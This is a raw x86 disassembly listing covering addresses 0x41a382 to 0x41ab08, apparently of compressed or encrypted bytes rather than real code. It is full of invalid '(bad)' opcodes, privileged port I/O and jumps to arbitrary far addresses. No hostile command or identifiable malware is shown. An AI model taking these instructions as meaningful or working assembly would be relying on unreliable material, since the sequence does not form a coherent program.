  41a382:	in     eax,0xbf
  41a384:	mov    edx,0x7c92b8f6
  41a389:	gs xor ch,0xb8
  41a38d:	lods   al,BYTE PTR ds:[esi]
  41a38e:	(bad)  
  41a38f:	fisttp DWORD PTR [eax+0x6ee9fe95]
  41a395:	inc    esi
  41a396:	scas   al,BYTE PTR es:[edi]
  41a397:	aas    
  41a398:	out    0xc3,eax
  41a39a:	push   0x2c
  41a39c:	push   eax
  41a39d:	out    0xec,al
  41a39f:	xor    BYTE PTR [edx-0x6a223aca],dl
  41a3a5:	push   ebp
  41a3a6:	popf   
  41a3a7:	aad    0xc7
  41a3a9:	sub    eax,0x825e4dbb
  41a3ae:	out    dx,al
  41a3af:	xor    eax,0x184e2720
  41a3b4:	xchg   ebp,eax
  41a3b5:	mov    esi,0x6361643d
  41a3ba:	adc    eax,0xc6374e34
  41a3bf:	mov    esp,0xe44b550f
  41a3c4:	dec    ebx
  41a3c5:	push   ebp
  41a3c6:	ficomp WORD PTR [ebx-0x5b]
  41a3c9:	add    dh,bh
  41a3cb:	ds push esp
  41a3cd:	dec    ebp
  41a3ce:	add    al,BYTE PTR [edx+edx*8-0x17]
  41a3d2:	call   0xcd84:0x1f822772
  41a3d9:	and    DWORD PTR [esi-0x27],edi
  41a3dc:	lea    ecx,[edx]
  41a3de:	add    dh,dh
  41a3e0:	rol    BYTE PTR [eax],1
  41a3e2:	and    ch,0x22
  41a3e5:	sbb    DWORD PTR [edi],esp
  41a3e7:	ficom  DWORD PTR [eax]
  41a3e9:	(bad)  
  41a3ea:	je     0x41a3b9
  41a3ec:	dec    edi
  41a3ed:	in     al,0x92
  41a3ef:	push   es
  41a3f0:	imul   eax,DWORD PTR [edi],0x3a
  41a3f3:	or     al,0x3c
  41a3f5:	mov    ecx,DWORD PTR [eax]
  41a3f7:	sbb    esi,ebp
  41a3f9:	aas    
  41a3fa:	mov    ds:0xbe77ce6,al
  41a3ff:	mov    eax,0x7a74b002
  41a404:	pop    es
  41a405:	jo     0x41a38b
  41a407:	test   BYTE PTR [edi+0x3e],dh
  41a40a:	and    ebx,ebp
  41a40c:	jle    0x41a414
  41a40e:	jl     0x41a3fe
  41a410:	dec    ecx
  41a411:	lock mov al,0x22
  41a414:	mov    eax,ds:0xf7bac88e
  41a419:	fsubp  st(6),st
  41a41b:	daa    
  41a41c:	in     al,dx
  41a41d:	sbb    BYTE PTR [edi-0x7c],cl
  41a420:	mov    WORD PTR [ecx-0x7d],?
  41a423:	imul   esp,DWORD PTR [edx],0x99b9f0d0
  41a429:	or     dl,cl
  41a42b:	fist   WORD PTR [edi+0x4]
  41a42e:	ss jl  0x41a494
  41a431:	ds ja  0x41a418
  41a434:	mov    eax,ds:0x69312d37
  41a439:	mov    esp,0x59f33d08
  41a43e:	fsubr  DWORD PTR [edi]
  41a440:	push   eax
  41a441:	fcmove st,st(6)
  41a443:	mov    edi,0xe4866d97
  41a448:	or     bl,ah
  41a44a:	xchg   cl,al
  41a44c:	(bad)  
  41a44d:	loopne 0x41a491
  41a44f:	call   0x824ddc6c
  41a454:	js     0x41a476
  41a456:	and    bl,BYTE PTR [ecx]
  41a458:	and    cl,cl
  41a45a:	(bad)  
  41a45b:	(bad)  
  41a45c:	jmp    0x68c1:0x44d6bcc7
  41a463:	mov    esp,0x685d4c76
  41a468:	fld    TBYTE PTR [esi+0x4a]
  41a46b:	cld    
  41a46c:	jne    0x41a44a
  41a46e:	jge    0x41a4cd
  41a470:	mov    BYTE PTR [edi+esi*2-0x6d157877],ah
  41a477:	enter  0x4bcf,0xab
  41a47b:	pop    ds
  41a47c:	into   
  41a47d:	cdq    
  41a47e:	pop    esp
  41a47f:	std    
  41a480:	xor    edx,DWORD PTR [ebx-0x7d]
  41a483:	mov    BYTE PTR [esi-0x20],al
  41a486:	mov    eax,ds:0x29503074
  41a48b:	hlt    
  41a48c:	ins    DWORD PTR es:[edi],dx
  41a48d:	lds    edi,FWORD PTR [eax-0x12]
  41a490:	ret    
  41a491:	xchg   dh,ch
  41a493:	add    BYTE PTR [ecx-0x772a2f0d],bl
  41a499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a49a:	mov    dl,0x46
  41a49c:	cmp    al,0x2a
  41a49e:	mov    bh,0xf8
  41a4a0:	mov    dh,0x5
  41a4a3:	xchg   ebp,eax
  41a4a4:	jae    0x41a453
  41a4a6:	mov    al,ds:0x496a63be
  41a4ab:	loop   0x41a49f
  41a4ad:	popa   
  41a4ae:	pop    ds
  41a4af:	mov    bh,0x22
  41a4b1:	add    eax,0x4e516d80
  41a4b6:	and    DWORD PTR ds:0x2c090afd,eax
  41a4bc:	and    ebp,DWORD PTR [ebx-0x7d0052c8]
  41a4c2:	imul   esi,DWORD PTR ds:[edi-0x756633fa],0x40f928da
  41a4cd:	pop    ss
  41a4ce:	and    cl,dl
  41a4d0:	add    ah,bh
  41a4d2:	xor    al,0x58
  41a4d4:	(bad)  
  41a4d5:	pop    eax
  41a4d6:	clc    
  41a4d7:	mov    ds:0x46168e2d,eax
  41a4dc:	ja     0x41a527
  41a4de:	test   eax,0xec56f7ca
  41a4e3:	clc    
  41a4e4:	test   al,0x60
  41a4e6:	data16 jns 0x41a521
  41a4e9:	push   ebp
  41a4ea:	pop    eax
  41a4eb:	add    DWORD PTR [esi-0x16],ebp
  41a4ee:	xor    al,0x93
  41a4f0:	add    eax,0xd2790e7a
  41a4f5:	sub    ah,BYTE PTR [esi-0x41]
  41a4f8:	repnz push cs
  41a4fa:	in     al,dx
  41a4fb:	sbb    al,0x72
  41a4fd:	arpl   bx,si
  41a4ff:	xchg   ecx,eax
  41a500:	clc    
  41a501:	or     BYTE PTR [bx+si],bh
  41a504:	sbb    bh,BYTE PTR [ebx-0x5f]
  41a507:	push   ss
  41a508:	mov    edi,0x5f7cd58d
  41a50d:	int    0x61
  41a50f:	or     al,0x2c
  41a511:	popa   
  41a512:	out    0x83,al
  41a514:	retf   
  41a515:	fmul   DWORD PTR [eax+0x52ad87f8]
  41a51b:	mov    al,0xd
  41a51d:	ret    0xb6e3
  41a520:	fdivrp st(5),st
  41a522:	je     0x41a4e6
  41a524:	ins    BYTE PTR es:[edi],dx
  41a525:	test   BYTE PTR [ecx-0x54],0x76
  41a529:	shr    BYTE PTR ds:[ecx-0x2bfd750],0x34
  41a531:	ins    DWORD PTR es:[edi],dx
  41a532:	jne    0x41a5ad
  41a534:	and    bl,bh
  41a536:	dec    ebx
  41a537:	imul   esi,DWORD PTR [edi+0x6ee46d8],0x292d055c
  41a541:	repz mov fs,WORD PTR [eax]
  41a544:	xor    ebp,ecx
  41a546:	addr16 xchg esp,eax
  41a548:	lea    ebp,[ecx]
  41a54a:	inc    ebp
  41a54b:	dec    ebp
  41a54c:	push   esp
  41a54d:	pushf  
  41a54e:	mov    ebp,0xd04cb7e1
  41a553:	(bad)  
  41a554:	push   0x2b
  41a556:	jg     0x41a539
  41a558:	mov    dh,0xa0
  41a55a:	outs   dx,BYTE PTR ds:[esi]
  41a55b:	mov    al,0x42
  41a55d:	loope  0x41a53c
  41a55f:	lods   al,BYTE PTR ds:[esi]
  41a560:	sbb    DWORD PTR [edi-0x3b],ebp
  41a563:	sub    eax,DWORD PTR [ecx]
  41a565:	repnz mov ebx,0xbd040e2a
  41a56b:	mov    eax,DWORD PTR [ecx-0x2b677127]
  41a571:	jecxz  0x41a4fb
  41a573:	push   ebp
  41a574:	sbb    eax,0xed94bed7
  41a579:	popf   
  41a57a:	xchg   ebp,ecx
  41a57c:	out    dx,eax
  41a57d:	(bad)  
  41a57e:	cmp    DWORD PTR [edx+0x63],eax
  41a581:	sbb    BYTE PTR [ebp-0x3f4a0ce6],bh
  41a587:	leave  
  41a588:	mov    eax,0xfc95468e
  41a58d:	or     al,BYTE PTR ds:0x9d99e4eb
  41a593:	mov    bl,0x5a
  41a595:	imul   esp,DWORD PTR [edi+0x46c53901],0x3a
  41a59c:	lds    ebx,FWORD PTR [ebx+0x243d38f0]
  41a5a2:	dec    edx
  41a5a3:	das    
  41a5a4:	jo     0x41a531
  41a5a6:	pop    edx
  41a5a7:	(bad)  
  41a5a8:	xor    BYTE PTR [ebp+0x38],ah
  41a5ab:	push   edx
  41a5ac:	nop
  41a5ad:	adc    BYTE PTR [edi+edx*2-0x3fc8e016],ch
  41a5b4:	push   edi
  41a5b5:	inc    edx
  41a5b6:	mov    cl,dh
  41a5b8:	push   es
  41a5b9:	daa    
  41a5ba:	adc    ecx,DWORD PTR [eax]
  41a5bc:	imul   esp,DWORD PTR [esi-0x3455e823],0x5988156f
  41a5c6:	dec    esi
  41a5c7:	jmp    0x5ee8e497
  41a5cc:	add    bl,BYTE PTR [esi+esi*8]
  41a5cf:	dec    BYTE PTR [eax+0x1daa23fe]
  41a5d5:	pop    ss
  41a5d6:	cmp    DWORD PTR [esi-0x60],ecx
  41a5d9:	add    bh,BYTE PTR [eax]
  41a5db:	(bad)  
  41a5dc:	jge    0x41a612
  41a5de:	adc    eax,edi
  41a5e0:	sub    al,0x8d
  41a5e2:	sbb    eax,0x9392c3f3
  41a5e7:	xchg   ebx,eax
  41a5e8:	cld    
  41a5e9:	test   DWORD PTR [edx],ebp
  41a5eb:	into   
  41a5ec:	jmp    0x9446:0xc530de95
  41a5f3:	xchg   edi,eax
  41a5f4:	sbb    al,0x7f
  41a5f6:	or     edi,edx
  41a5f8:	xchg   BYTE PTR [esi+0x62],bl
  41a5fb:	daa    
  41a5fc:	ds and bl,dl
  41a5ff:	into   
  41a600:	fadd   st,st(5)
  41a602:	pop    edx
  41a603:	icebp  
  41a604:	pusha  
  41a605:	cs sbb ecx,edi
  41a608:	cwde   
  41a609:	dec    esp
  41a60a:	outs   dx,BYTE PTR ds:[esi]
  41a60b:	fisttp WORD PTR [ecx+0x67]
  41a60e:	lods   al,BYTE PTR gs:[esi]
  41a610:	or     al,0x9e
  41a612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a613:	mov    dl,0x34
  41a615:	jmp    0x41a62a
  41a617:	cld    
  41a618:	xchg   edx,eax
  41a619:	ret    
  41a61a:	pop    eax
  41a61b:	cmc    
  41a61c:	pop    ds
  41a61d:	fst    DWORD PTR [esi]
  41a61f:	loopne 0x41a5dc
  41a621:	dec    ebp
  41a622:	(bad)  [edx-0x11]
  41a625:	jge    0x41a5c7
  41a627:	jno    0x41a5d7
  41a629:	in     al,0xf8
  41a62b:	sbb    ebx,esp
  41a62d:	(bad)  
  41a62e:	icebp  
  41a62f:	adc    eax,0x5791935d
  41a634:	and    DWORD PTR [edi-0x6c],ebp
  41a637:	mov    eax,0x94e19a77
  41a63c:	sbb    ebx,DWORD PTR [esi]
  41a63e:	mov    ah,0xd0
  41a640:	jno    0x41a66d
  41a642:	and    eax,0x700d752d
  41a647:	and    DWORD PTR [bp+di-0x46],ebp
  41a64b:	jo     0x41a5d1
  41a64d:	inc    ebx
  41a64e:	jecxz  0x41a5da
  41a650:	add    ebx,DWORD PTR [ebx]
  41a652:	pop    ebx
  41a653:	dec    ebx
  41a654:	into   
  41a655:	es loop 0x41a63c
  41a658:	rol    BYTE PTR [edx],0xca
  41a65b:	push   0x6
  41a65d:	inc    esp
  41a65e:	add    al,0x59
  41a660:	out    dx,al
  41a661:	and    BYTE PTR [ecx+0x11],ch
  41a664:	sub    edx,DWORD PTR [ecx]
  41a666:	inc    ecx
  41a667:	inc    al
  41a669:	cmp    al,0xba
  41a66b:	in     al,0xc3
  41a66d:	aad    0x53
  41a66f:	inc    eax
  41a670:	sub    dl,BYTE PTR [eax]
  41a672:	mov    al,0xca
  41a674:	fwait
  41a675:	adc    ah,dh
  41a677:	fcom   DWORD PTR [esp+edx*1]
  41a67a:	or     ecx,edx
  41a67c:	fsub   DWORD PTR [edx+0x3c]
  41a680:	sub    BYTE PTR [esi+0x55],0xc3
  41a684:	mov    edx,0x98a8d9e0
  41a689:	adc    bh,bh
  41a68b:	ss mov bl,0xbb
  41a68e:	imul   ecx,DWORD PTR [edi],0x293d7a92
  41a694:	inc    BYTE PTR [esp+ebp*4+0x5f271a35]
  41a69b:	lahf   
  41a69c:	push   0xa682bd48
  41a6a1:	jp     0x41a71f
  41a6a3:	pop    es
  41a6a4:	test   BYTE PTR [ebp-0x63],al
  41a6a7:	add    eax,0xcc49f414
  41a6ac:	int    0xe1
  41a6ae:	and    edi,DWORD PTR [ebx-0x15]
  41a6b1:	sub    BYTE PTR [ebx-0x54],dl
  41a6b4:	addr16 push eax
  41a6b6:	sbb    edi,DWORD PTR [esi-0x71]
  41a6b9:	ja     0x41a701
  41a6bb:	or     bl,bh
  41a6bd:	shr    BYTE PTR [edi+0x2f],cl
  41a6c0:	pop    esp
  41a6c1:	push   0x4e
  41a6c3:	repz icebp 
  41a6c5:	mov    ds:0x36663c31,al
  41a6ca:	lds    esi,FWORD PTR ds:0xe5899f44
  41a6d0:	pop    ebp
  41a6d1:	push   ds
  41a6d2:	(bad)  
  41a6d3:	mov    ecx,0x1fb5299a
  41a6d8:	iret   
  41a6d9:	dec    ebx
  41a6da:	adc    eax,0x7649a324
  41a6df:	test   BYTE PTR ds:0x5e9e92bd,0x9e
  41a6e6:	aad    0xe1
  41a6e8:	inc    edi
  41a6e9:	lods   al,BYTE PTR ds:[esi]
  41a6ea:	mov    dh,0x73
  41a6ec:	inc    edx
  41a6ed:	repnz mov ebx,0x378fdcd5
  41a6f3:	or     BYTE PTR [eax-0x3d],al
  41a6f6:	dec    esp
  41a6f7:	enter  0x958e,0xb0
  41a6fb:	iret   
  41a6fc:	rcl    ah,1
  41a6fe:	aaa    
  41a6ff:	addr16 xor al,0xc
  41a702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a704:	and    cl,ah
  41a706:	ds cli 
  41a708:	ret    0x5895
  41a70b:	mov    bh,0x98
  41a70d:	or     BYTE PTR [bp+di],bh
  41a710:	lods   al,BYTE PTR ds:[esi]
  41a711:	xchg   ebx,eax
  41a712:	(bad)  
  41a713:	js     0x41a6c2
  41a715:	aas    
  41a716:	sbb    BYTE PTR [eax-0xc7a430d],bh
  41a71c:	jecxz  0x41a701
  41a71e:	cwde   
  41a71f:	call   0x9697:0x375579a4
  41a726:	outs   dx,BYTE PTR ds:[esi]
  41a727:	div    BYTE PTR [ebp-0x5eaba7ca]
  41a72d:	dec    esp
  41a72e:	retf   0x3fa2
  41a731:	dec    ecx
  41a732:	cli    
  41a733:	mov    bh,0xb8
  41a735:	call   0xbdcc:0x79e0d600
  41a73c:	retf   0xa820
  41a73f:	jnp    0x41a79d
  41a741:	icebp  
  41a742:	mov    dh,0x67
  41a744:	ja     0x41a767
  41a746:	lods   eax,DWORD PTR ds:[esi]
  41a747:	and    cl,0x92
  41a74a:	into   
  41a74b:	sub    eax,0xcc4299ea
  41a750:	cmp    ch,bh
  41a752:	jae    0x41a6df
  41a754:	xlat   BYTE PTR ds:[ebx]
  41a755:	stos   DWORD PTR es:[edi],eax
  41a756:	addr16 jp 0x41a790
  41a759:	(bad)  
  41a75a:	xchg   edi,eax
  41a75b:	jbe    0x41a7a1
  41a75d:	fdiv   QWORD PTR [ebp-0x39]
  41a760:	int    0x66
  41a762:	loope  0x41a755
  41a764:	arpl   WORD PTR fs:[edx-0x3b],dx
  41a768:	adc    edx,ecx
  41a76a:	retf   0xdc8e
  41a76d:	mov    ecx,0x931736cd
  41a772:	sar    BYTE PTR [ebp+0x1cec1aa],cl
  41a778:	push   edx
  41a779:	(bad)  
  41a77a:	in     al,dx
  41a77b:	dec    edi
  41a77c:	std    
  41a77d:	adc    eax,0xb5cc4e4e
  41a782:	jns    0x41a77e
  41a784:	sbb    BYTE PTR [edi+0x7dd95f78],ah
  41a78a:	sahf   
  41a78b:	pop    ebx
  41a78c:	push   edx
  41a78d:	leave  
  41a78e:	jae    0x41a7af
  41a790:	int3   
  41a791:	pop    esp
  41a792:	push   es
  41a793:	sub    bl,BYTE PTR [ecx]
  41a795:	rcr    DWORD PTR [esi-0x79a071f9],cl
  41a79b:	fsub   DWORD PTR [esi+ecx*1]
  41a79e:	push   edi
  41a79f:	push   ds
  41a7a0:	leave  
  41a7a1:	dec    edi
  41a7a2:	ficom  WORD PTR [eax]
  41a7a4:	out    0x82,eax
  41a7a6:	cs mov edi,0x8c516767
  41a7ac:	sbb    bh,BYTE PTR [eax+0x64]
  41a7af:	jg     0x41a7e1
  41a7b1:	sbb    BYTE PTR [ebp-0x7c1f5b80],dh
  41a7b7:	add    esi,DWORD PTR [edx+0x38]
  41a7ba:	mov    BYTE PTR [esi-0x75],dl
  41a7bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7be:	sub    al,0x62
  41a7c0:	push   ecx
  41a7c1:	mov    ds:0x9780d808,eax
  41a7c6:	cmp    BYTE PTR [edi+ebp*4],bh
  41a7c9:	cmp    BYTE PTR [edx-0x7b],al
  41a7cc:	jmp    FWORD PTR [edx-0x41]
  41a7cf:	bound  ebx,QWORD PTR [ecx+esi*2+0x68]
  41a7d3:	popa   
  41a7d4:	mov    bl,0xa9
  41a7d6:	push   0x5f361329
  41a7db:	test   eax,0x76a8996b
  41a7e0:	push   0x2
  41a7e2:	or     bh,BYTE PTR [ebx+0x13]
  41a7e5:	fs inc si
  41a7e8:	lods   eax,DWORD PTR ds:[esi]
  41a7e9:	ins    DWORD PTR es:[edi],dx
  41a7ea:	ret    
  41a7eb:	rol    DWORD PTR [ebx-0x36],1
  41a7ee:	add    DWORD PTR [edi+0x3ebd3c88],ecx
  41a7f4:	jge    0x41a7ce
  41a7f6:	adc    al,0x7
  41a7f8:	out    0xb1,eax
  41a7fa:	cmc    
  41a7fb:	fwait
  41a7fc:	mov    ?,esp
  41a7fe:	cdq    
  41a7ff:	xor    bl,ah
  41a801:	inc    ebp
  41a802:	dec    ebx
  41a803:	sub    eax,0x93531f04
  41a808:	cmc    
  41a809:	sub    ecx,DWORD PTR [edi]
  41a80b:	add    BYTE PTR [edx-0x34],bh
  41a80e:	jnp    0x41a7d0
  41a810:	add    al,0x8d
  41a812:	dec    edi
  41a813:	call   0xe5477172
  41a818:	fcomp  QWORD PTR [edx+0x54]
  41a81b:	pop    ebx
  41a81c:	or     esi,ecx
  41a81e:	or     BYTE PTR [eax+ebp*4-0x66],dh
  41a822:	(bad)  
  41a823:	dec    esi
  41a824:	dec    esi
  41a825:	mov    esp,0x3082ff5c
  41a82a:	sbb    al,0x80
  41a82c:	jmp    0x41a871
  41a82e:	jmp    0xb413:0xc87a1f7
  41a835:	das    
  41a836:	fst    st(3)
  41a838:	dec    edx
  41a839:	jg     0x41a875
  41a83b:	inc    ebx
  41a83c:	cmp    al,0x7a
  41a83e:	adc    ebp,ebx
  41a840:	xor    esi,DWORD PTR [ebx+0x22cd3dc4]
  41a846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a847:	mov    ecx,0xc49b35d6
  41a84c:	in     eax,0xe9
  41a84e:	in     al,0x66
  41a850:	push   ecx
  41a851:	jb     0x41a7e1
  41a853:	jno    0x41a8c8
  41a855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a856:	pop    ecx
  41a857:	add    al,0x2
  41a859:	mov    BYTE PTR [ebx+0x20],dl
  41a85c:	fimul  DWORD PTR [esi+esi*2-0x33]
  41a860:	out    0x9f,eax
  41a862:	inc    ebx
  41a863:	xor    eax,0x5f66c225
  41a868:	fs xchg esi,eax
  41a86a:	mov    ds:0xb61942e,al
  41a86f:	push   es
  41a870:	pop    ecx
  41a871:	or     eax,0x5f8cacbb
  41a876:	mov    edx,0xb6baec98
  41a87b:	mov    edx,DWORD PTR [edi-0x1d0219ca]
  41a881:	xchg   edx,eax
  41a882:	xchg   DWORD PTR [esi-0x2e3ec5f2],esp
  41a888:	fwait
  41a889:	call   FWORD PTR [edx-0x2c544b0a]
  41a88f:	dec    ebp
  41a890:	sti    
  41a891:	xor    DWORD PTR [ebp-0x3fc2684e],ebx
  41a897:	hlt    
  41a898:	mov    edi,0xc266139f
  41a89d:	push   0x76fd7c5a
  41a8a2:	jle    0x41a8c8
  41a8a4:	push   ebx
  41a8a5:	fst    QWORD PTR [ecx]
  41a8a7:	repz or BYTE PTR [eax+0x46c035d],ah
  41a8ae:	jae    0x41a881
  41a8b0:	dec    esi
  41a8b1:	out    0xca,eax
  41a8b3:	(bad)  
  41a8b4:	xchg   esi,eax
  41a8b5:	push   0xd76e52e3
  41a8ba:	mov    ah,0x43
  41a8bc:	sub    al,0xca
  41a8be:	mov    DWORD PTR fs:[ecx+edi*4+0x72f4b879],ebp
  41a8c6:	mov    bh,0xc3
  41a8c8:	dec    edi
  41a8c9:	xor    eax,DWORD PTR [ebp+0x7bb4e285]
  41a8cf:	or     BYTE PTR [eax],al
  41a8d1:	pop    ss
  41a8d2:	xchg   esi,eax
  41a8d3:	out    0x60,al
  41a8d5:	inc    ecx
  41a8d6:	mov    edx,0xd7451e9d
  41a8db:	xor    ebx,DWORD PTR [edi+0x7f88a13e]
  41a8e1:	sar    BYTE PTR [ecx],1
  41a8e3:	lods   eax,DWORD PTR ds:[esi]
  41a8e4:	sub    al,dl
  41a8e6:	enter  0x8f7d,0x4d
  41a8ea:	aaa    
  41a8eb:	scas   eax,DWORD PTR es:[edi]
  41a8ec:	test   DWORD PTR [esi+0x742ba4af],ebp
  41a8f2:	ret    0x9daf
  41a8f5:	or     al,0x61
  41a8f7:	aaa    
  41a8f8:	mov    ds:0xbd58cf9,eax
  41a8fd:	add    DWORD PTR [edx-0x6dc52702],edx
  41a903:	out    dx,al
  41a904:	mov    edx,ds
  41a906:	loope  0x41a96e
  41a908:	loop   0x41a8c3
  41a90a:	cmp    eax,0x3c35f108
  41a90f:	jmp    0x41a8dc
  41a911:	xchg   ecx,eax
  41a912:	lds    edi,FWORD PTR [edx]
  41a914:	fst    QWORD PTR [esi]
  41a916:	stc    
  41a917:	pop    edi
  41a918:	aam    0xc9
  41a91a:	lds    esi,FWORD PTR [edx]
  41a91c:	dec    esi
  41a91d:	out    0xee,eax
  41a91f:	rol    BYTE PTR [ecx+0xf44c8ba],cl
  41a925:	push   edi
  41a926:	loop   0x41a8ae
  41a928:	jae    0x41a942
  41a92a:	aaa    
  41a92b:	mov    ecx,DWORD PTR [edx-0x3d]
  41a92e:	into   
  41a92f:	push   esi
  41a930:	fist   DWORD PTR [ebp-0x3b]
  41a933:	xor    BYTE PTR [esi-0x1cda0f70],dl
  41a939:	mov    DWORD PTR [edi+ebx*8-0xb86c55f],0x75ef0dee
  41a944:	inc    ebp
  41a945:	js     0x41a9a1
  41a947:	jge    0x41a9bc
  41a949:	xchg   ecx,eax
  41a94a:	cmp    DWORD PTR [eax+0x67b1eb8e],0x39af4834
  41a954:	clc    
  41a955:	pop    ebx
  41a956:	sbb    esp,ecx
  41a958:	jb     0x41a8e4
  41a95a:	mov    ah,0xb4
  41a95c:	ret    0x9d36
  41a95f:	pop    edi
  41a960:	out    dx,al
  41a961:	addr16 in eax,0xe8
  41a964:	in     al,dx
  41a965:	ins    DWORD PTR es:[edi],dx
  41a966:	std    
  41a967:	sub    DWORD PTR [ebx-0x719fe628],ebx
  41a96d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a96e:	pop    ebx
  41a96f:	sbb    BYTE PTR [edx+0x5e],ah
  41a972:	ds mov ebx,0x31c2fb9b
  41a978:	mov    edx,0x1efc9f36
  41a97d:	das    
  41a97e:	shr    BYTE PTR [edi+0x5d0b1f97],0x46
  41a985:	or     edx,ebp
  41a987:	pop    esi
  41a988:	jp     0x41aa06
  41a98a:	or     al,0xf1
  41a98c:	ror    BYTE PTR [eax],cl
  41a98e:	in     al,0x58
  41a990:	icebp  
  41a991:	adc    al,0xcd
  41a993:	adc    BYTE PTR [eax],bh
  41a995:	retf   
  41a996:	lock xor al,0x7c
  41a999:	xor    BYTE PTR [ecx],dl
  41a99b:	pop    ebx
  41a99c:	mov    fs,esp
  41a99e:	cwde   
  41a99f:	loop   0x41a93c
  41a9a1:	out    0x28,al
  41a9a3:	les    ebp,FWORD PTR [eax-0x70]
  41a9a6:	add    al,0x8a
  41a9a8:	lods   al,BYTE PTR ds:[esi]
  41a9a9:	scas   eax,DWORD PTR es:[edi]
  41a9aa:	adc    dh,BYTE PTR [ebx+0xd]
  41a9ad:	inc    edi
  41a9ae:	mov    WORD PTR [edx-0x71],fs
  41a9b1:	jno    0x41aa1b
  41a9b3:	mov    ebp,esp
  41a9b5:	loope  0x41a95e
  41a9b7:	(bad)  
  41a9b8:	std    
  41a9b9:	sub    al,0xae
  41a9bb:	outs   dx,BYTE PTR ds:[esi]
  41a9bc:	jo     0x41aa38
  41a9be:	arpl   WORD PTR [edi-0x6c68495a],bx
  41a9c4:	(bad)  
  41a9c5:	out    0xfa,al
  41a9c7:	mov    edx,0xeaf41d40
  41a9cc:	sti    
  41a9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ce:	int    0x93
  41a9d0:	sbb    eax,0xa25d3f87
  41a9d5:	xchg   ecx,eax
  41a9d6:	lods   al,BYTE PTR ds:[esi]
  41a9d7:	or     ah,bl
  41a9d9:	xor    edi,edi
  41a9db:	mov    esp,0xfa8a1683
  41a9e0:	es cmp eax,0x515b72af
  41a9e6:	adc    WORD PTR [ecx],di
  41a9e9:	ficomp DWORD PTR [esi-0xe]
  41a9ec:	push   0x21ac4266
  41a9f1:	sahf   
  41a9f2:	mov    bl,0x85
  41a9f4:	xchg   esi,edi
  41a9f6:	lea    eax,[ecx+0x18]
  41a9f9:	inc    edi
  41a9fa:	mov    dh,cl
  41a9fc:	je     0x41a9ab
  41a9fe:	jb     0x41a9f4
  41aa00:	in     al,0xe3
  41aa02:	scas   eax,DWORD PTR es:[edi]
  41aa03:	push   edi
  41aa04:	sub    DWORD PTR [edx],edi
  41aa06:	mov    ebp,0xec23d345
  41aa0b:	sub    DWORD PTR [eax+0x620dabe7],edx
  41aa11:	aam    0x6b
  41aa13:	inc    ecx
  41aa14:	jl     0x41a9e3
  41aa16:	cli    
  41aa17:	and    al,0x61
  41aa19:	pushf  
  41aa1a:	popf   
  41aa1b:	aas    
  41aa1c:	(bad)
  41aa20:	or     al,0x5c
  41aa22:	fsub   DWORD PTR [ebx]
  41aa24:	xchg   esp,eax
  41aa25:	and    BYTE PTR [edi+ebx*4-0x48],cl
  41aa29:	fnstcw WORD PTR [esi+0x6a]
  41aa2c:	mov    ebp,0x5f5f8dcf
  41aa31:	call   0xe4afa6fe
  41aa36:	fdiv   QWORD PTR [edx]
  41aa38:	in     al,0x5f
  41aa3a:	fisubr DWORD PTR [ebx]
  41aa3c:	sbb    eax,0xd4f6f1b0
  41aa41:	dec    ebp
  41aa42:	and    eax,0x3557695
  41aa47:	or     BYTE PTR [edx+0x2707b974],dh
  41aa4d:	xlat   BYTE PTR ds:[ebx]
  41aa4e:	inc    esp
  41aa4f:	mov    esp,0xd3b933a
  41aa54:	sub    BYTE PTR [esp+ecx*1+0x768844c0],cl
  41aa5b:	(bad)  
  41aa5c:	xchg   ebp,eax
  41aa5d:	inc    eax
  41aa5e:	jl     0x41aabe
  41aa60:	into   
  41aa61:	mov    cl,0x5
  41aa63:	dec    ebp
  41aa64:	rol    DWORD PTR [edi],0x67
  41aa67:	xlat   BYTE PTR ds:[ebx]
  41aa68:	div    esp
  41aa6a:	push   esi
  41aa6b:	cmp    DWORD PTR [eiz*2-0x135d8d00],edx
  41aa72:	or     ah,dh
  41aa74:	jmp    0x41aa6b
  41aa76:	jecxz  0x41aa5a
  41aa78:	adc    BYTE PTR [edx+0x4ab405ac],0x1c
  41aa7f:	add    al,0x95
  41aa81:	dec    esi
  41aa82:	mov    edx,0xed3b8822
  41aa87:	ins    DWORD PTR es:[edi],dx
  41aa88:	mov    cl,0xbc
  41aa8a:	push   0xdd8227db
  41aa8f:	mov    ah,0x32
  41aa91:	(bad)  
  41aa92:	les    edx,FWORD PTR [ecx+esi*8]
  41aa95:	ret    0x9b5
  41aa98:	bswap  esi
  41aa9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa9b:	sti    
  41aa9c:	pop    ss
  41aa9d:	push   esp
  41aa9e:	imul   eax,eax,0xffffffb1
  41aaa1:	mov    bh,0xa6
  41aaa3:	std    
  41aaa4:	pop    ss
  41aaa5:	call   FWORD PTR [esi+0x4d]
  41aaa8:	cmp    al,0x99
  41aaaa:	into   
  41aaab:	aas    
  41aaac:	dec    eax
  41aaad:	mov    bl,0xc8
  41aaaf:	jbe    0x41aadc
  41aab1:	sahf   
  41aab2:	ds adc ch,dl
  41aab5:	mov    ebx,0xa42d666
  41aaba:	mov    ds:0x55a2e608,eax
  41aabf:	out    dx,eax
  41aac0:	add    bl,BYTE PTR [esi+esi*2+0x45]
  41aac4:	push   ss
  41aac5:	dec    edi
  41aac6:	in     al,dx
  41aac7:	imul   ebx,DWORD PTR [ebp-0x5387dd10],0xe4c012e6
  41aad1:	bound  edi,QWORD PTR [edx]
  41aad3:	daa    
  41aad4:	jno    0x41aad5
  41aad6:	into   
  41aad7:	and    DWORD PTR [ecx+0x76be1447],0x219c7aaf
  41aae1:	jge    0x41ab49
  41aae3:	lahf   
  41aae4:	rcl    BYTE PTR [ecx-0x795e7bc1],0x93
  41aaeb:	and    eax,0xb4c6aa99
  41aaf0:	xor    eax,0x5256b119
  41aaf5:	shr    BYTE PTR [ebp-0x1c7d4957],cl
  41aafb:	mov    ebp,0x707658c5
  41ab00:	(bad)  
  41ab01:	adc    eax,0x5c6fe7cb
  41ab06:	jle    0x41ab37
  41ab08:	sahf   
